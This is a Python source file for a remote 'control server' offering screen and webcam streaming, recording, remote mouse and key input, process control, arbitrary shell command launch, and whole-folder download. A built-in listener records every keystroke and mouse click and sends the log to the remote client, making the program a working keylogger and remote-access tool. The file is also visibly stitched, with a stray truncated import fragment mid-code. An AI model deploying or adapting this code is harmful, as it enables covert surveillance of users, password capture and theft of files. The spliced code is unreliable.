import socket
import ssl
import cv2
import mss
import numpy as np
import pyautogui
import struct
import threading
import random
import psutil
import logging
import string
import json
import subprocess
import time
import re
import zipfile
import sys
from pathlib import Path
from pynput import keyboard, mouse

# --- CONFIGURATION & LOGGING ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ==========================================
# PART 1: COMMAND INTERFACE & REGISTRY
# ==========================================

class BaseCommand:
    """Interface for all server commands."""
    def execute(self, server, conn, data):
        raise NotImplementedError

class CommandRegistry:
    """Registry to map command types to their respective classes."""
    _commands = {}

    @classmethod
    def register(cls, cmd_type):
        def decorator(command_class):
            cls._commands[cmd_type] = command_class()
            return command_class
        return decorator

    @classmethod
    def get(cls, cmd_type):
        return cls._commands.get(cmd_type)

# ==========================================
# PART 2: SPECIFIC COMMAND IMPLEMENTATIONS
# ==========================================

@CommandRegistry.register("MOUSE")
class MouseCommand(BaseCommand):
    def execute(self, server, conn, data):
        pyautogui.click(data['x'], data['y'], button=data.get('btn', 'left'))

@CommandRegistry.register("KEY")
class KeyCommand(BaseCommand):
    def execute(self, server, conn, data):
        pyautogui.press(data['key'])

@CommandRegistry.register("STREAM_CTRL")
class StreamCtrlCommand(BaseCommand):
    def execute(self, server, conn, data):
        server.is_streaming = data['active']
        server.stream_mode = data.get('mode', "SCREEN")

@CommandRegistry.register("LIST_PROCS")
class ListProcsCommand(BaseCommand):
    def execute(self, server, conn, data):
        procs = [p.info for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent'])]
        server.send_json(conn, procs)

@CommandRegistry.register("KILL_PROC")
class KillProcCommand(BaseCommand):
    def execute(self, server, conn, data):
        try:
            psutil.Process(data['pid']).terminate()
            conn.sendall(b"OK")
        except: conn.sendall(b"FAIL")

@CommandRegistry.register("LIST_APPS")
class ListAppsCommand(BaseCommand):
    def execute(self, server, conn, data):
        apps = []
        search_paths = [Path("/usr/share/applications"), Path("/var/lib/snapd/desktop/applications"), Path.home()/".local/share/applications"]
        for p in search_paths:
            if p.exists():
                for f in p.glob("*.desktop"):
                    try:
                        with open(f, 'r', errors='ignore') as df:
                            content = df.read()
                            name = re.search(r'^Name=(.*)', content, re.M)
                            exec_c = re.search(r'^Exec=(.*)', content, re.M)
                            if name and exec_c:
                                apps.append({"name": name.group(1).strip(), "exec": re.sub(r'%[a-zA-Z]', '', exec_c.group(1)).strip(), "sw": "Application" in content})
                    except: continue
        apps.sort(key=lambda x: x['sw'], reverse=True)
        server.send_json(conn, apps)

@CommandRegistry.register("START_APP")
class StartAppCommand(BaseCommand):
    def execute(self, server, conn, data):
        try:
            subprocess.Popen(data['exec'], shell=True, start_new_session=True)
            conn.sendall(b"OK")
        except: conn.sendall(b"FAIL")

@CommandRegistry.register("LIST_FILES")
class ListFilesCommand(BaseCommand):
    def execute(self, server, conn, data):
        p = Path(data['path'])
        files = []
        if p.exists() and p.is_dir():
            for item in p.iterdir():
                try: files.append({"name": item.name, "is_dir": item.is_dir(), "size": item.stat().st_size if not item.is_dir() else 0})
                except: continue
        server.send_json(conn, files)

@CommandRegistry.register("DOWNLOAD")
class DownloadCommand(BaseCommand):
    def execute(self, server, conn, data):
        p = Path(data['path'])
        if p.is_dir():
            zip_p = Path("temp_dl.zip")
            with zipfile.ZipFile(zip_p, 'w') as z:
                for f in p.rglob('*'): z.write(f, f.relative_to(p))
            p = zip_p
        if p.is_file():
            sz = p.stat().st_size
            conn.sendall(struct.pack("!Q", sz))
            with open(p, "rb") as f:
                while chunk := f.read(32768): conn.sendall(chunk)
        else: conn.sendall(struct.pack("!Q", 0))

@CommandRegistry.register("SCREENSHOT")
class ScreenshotCommand(BaseCommand):
    def execute(self, server, conn, data):
        with mss.mss() as sct:
            if data.get('mode') == "WEBCAM":
                cap = cv2.VideoCapture(0); ret, img = cap.read(); cap.release()
                if not ret: return
            else:
                img = np.array(sct.grab(sct.monitors[1]))
                img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
            _, enc = cv2.imencode('.jpg', img)
            raw = enc.tobytes()
            conn.sendall(struct.pack("!I", len(raw)) + raw)

@CommandRegistry.register("REC_START")
class RecStartCommand(BaseCommand):
    def execute(self, server, conn, data):
        server.is_recording = True
        server.recorder = cv2.VideoWriter("temp_rec.mp4", cv2.VideoWriter_fourcc(*'mp4v'), 10, (1280, 720))
        conn.sendall(b"OK")

@CommandRegistry.register("REC_STOP")
class RecStopCommand(BaseCommand):
    def execute(self, server, conn, data):
        server.is_recording = False
        if server.recorder: server.recorder.release(); server.recorder = None
        p = Path("temp_rec.mp4")
        if p.exists():
            conn.sendall(struct.pack("!Q", p.stat().st_size))
            with open(p, "rb") as f:
                while chunk := f.read(32768): conn.sendall(chunk)
        else: conn.sendall(struct.pack("!Q", 0))
import os
import socket
...
@CommandRegistry.register("GET_LOGS")
class GetLogsCommand(BaseCommand):
    def execute(self, server, conn, data):
        logs = list(server.activity_logs)
        server.activity_logs.clear()
        server.send_json(conn, logs)

@CommandRegistry.register("SHUTDOWN")
class ShutdownCommand(BaseCommand):
    def execute(self, server, conn, data):
        logging.info("Server shutting down...")
        conn.sendall(b"OK")
        time.sleep(2)
        if sys.platform == "win32": os.system("shutdown /s /t 1")
        else: os.system("systemctl poweroff")

@CommandRegistry.register("RESTART")
class RestartCommand(BaseCommand):
    def execute(self, server, conn, data):
        logging.info("Server restarting...")
        conn.sendall(b"OK")
        time.sleep(2)
        if sys.platform == "win32": os.system("shutdown /r /t 1")
        else: os.system("systemctl reboot")

# ==========================================
# PART 3: MAIN SERVER CORE
# ==========================================

class ControlServer:
    def __init__(self):
        self.host = '0.0.0.0'
        self.port_stream = 9998
        self.port_cmd = 9999
        self.password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
        self.running = True
        self.is_streaming = False
        self.stream_mode = "SCREEN"
        self.is_recording = False
        self.recorder = None
        self.activity_logs = []
        
        # Setup Listeners
        self.start_listeners()
        self.ssl_context = self.setup_ssl()
        
        try:
            w, h = pyautogui.size()
            self.native_res = (w, h) if w > 0 else (1280, 720)
        except: self.native_res = (1280, 720)

        print(f"\n{'='*50}\nCONTROL SERVER - ONLINE\nIP: {self.get_local_ip()}\nPASS: {self.password}\n{'='*50}\n")

    def get_local_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try: s.connect(('8.8.8.8', 1)); ip = s.getsockname()[0]
        except: ip = '127.0.0.1'
        finally: s.close()
        return ip

    def setup_ssl(self):
        cp, kp = Path("server.crt"), Path("server.key")
        if not (cp.exists() and kp.exists()): self.generate_certs(cp, kp)
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ctx.load_cert_chain(certfile=cp, keyfile=kp)
        return ctx

    def generate_certs(self, cp, kp):
        from cryptography import x509
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        import datetime
        key = rsa.generate_private_key(65537, 2048)
        sub = iss = x509.Name([x509.NameAttribute(x509.NameOID.COMMON_NAME, u"localhost")])
        cert = x509.CertificateBuilder().subject_name(sub).issuer_name(iss).public_key(key.public_key()).serial_number(x509.random_serial_number()).not_valid_before(datetime.datetime.utcnow()).not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365)).sign(key, hashes.SHA256())
        with open(kp, "wb") as f: f.write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
        with open(cp, "wb") as f: f.write(cert.public_bytes(serialization.Encoding.PEM))

    def start_listeners(self):
        def op(k):
            try: self.activity_logs.append(f"[{time.strftime('%H:%M:%S')}] Key: {k.char}")
            except: self.activity_logs.append(f"[{time.strftime('%H:%M:%S')}] Special: {k}")
        def oc(x, y, b, p):
            if p: self.activity_logs.append(f"[{time.strftime('%H:%M:%S')}] Mouse {b} at ({x}, {y})")
        self.kl = keyboard.Listener(on_press=op); self.kl.start()
        self.ml = mouse.Listener(on_click=oc); self.ml.start()

    def stop(self):
        self.running = False
        self.kl.stop(); self.ml.stop()
        if self.recorder: self.recorder.release()

    def stream_loop(self):
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); raw.settimeout(1.0)
        raw.bind((self.host, self.port_stream)); raw.listen(10)
        while self.running:
            try:
                c, _ = raw.accept()
                sc = self.ssl_context.wrap_socket(c, server_side=True)
                threading.Thread(target=self.handle_stream, args=(sc,), daemon=True).start()
            except socket.timeout: continue
            except Exception as e: logging.error(f"Stream Error: {e}")

    def handle_stream(self, conn):
        cam = cv2.VideoCapture(0)
        with mss.mss() as sct:
            try:
                while self.running:
                    if self.stream_mode == "SCREEN":
                        img = np.array(sct.grab(sct.monitors[1]))
                        f = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                    else:
                        ret, f = cam.read()
                        if not ret: f = np.zeros((480, 640, 3), np.uint8)
                    if self.is_recording and self.recorder: self.recorder.write(cv2.resize(f, (1280, 720)))
                    if not self.is_streaming: time.sleep(0.5); continue
                    _, enc = cv2.imencode('.jpg', f, [cv2.IMWRITE_JPEG_QUALITY, 45])
                    b = enc.tobytes()
                    conn.sendall(struct.pack("!I", len(b)) + b)
            except: pass
            finally: conn.close(); cam.release()

    def command_loop(self):
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); raw.settimeout(1.0)
        raw.bind((self.host, self.port_cmd)); raw.listen(10)
        while self.running:
            try:
                c, _ = raw.accept()
                sc = self.ssl_context.wrap_socket(c, server_side=True)
                threading.Thread(target=self.handle_command, args=(sc,), daemon=True).start()
            except socket.timeout: continue
            except Exception as e: logging.error(f"Command Error: {e}")

    def handle_command(self, conn):
        try:
            pwd = conn.recv(1024).decode()
            if pwd != self.password:
                res = json.dumps({"status": "FAIL", "msg": "Invalid Password"}).encode()
                conn.sendall(struct.pack("!I", len(res)) + res); conn.close(); return
            res = json.dumps({"status": "OK", "w": self.native_res[0], "h": self.native_res[1]}).encode()
            conn.sendall(struct.pack("!I", len(res)) + res)
            
            while self.running:
                h = conn.recv(4)
                if not h: break
                sz = struct.unpack("!I", h)[0]
                req = b""
                while len(req) < sz:
                    ch = conn.recv(min(sz-len(req), 8192))
                    if not ch: break
                    req += ch
                if not req: break
                data = json.loads(req.decode())
                
                # --- COMMAND PATTERN EXECUTION ---
                command = CommandRegistry.get(data['type'])
                if command:
                    command.execute(self, conn, data)
                else:
                    logging.warning(f"Unknown Command: {data['type']}")
        except: pass
        finally: conn.close()

    def send_json(self, conn, data):
        p = json.dumps(data).encode('utf-8')
        conn.sendall(struct.pack("!I", len(p)) + p)

if __name__ == "__main__":
    server = ControlServer()
    threading.Thread(target=server.stream_loop, daemon=True).start()
    threading.Thread(target=server.command_loop, daemon=True).start()
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        server.stop(); sys.exit(0)
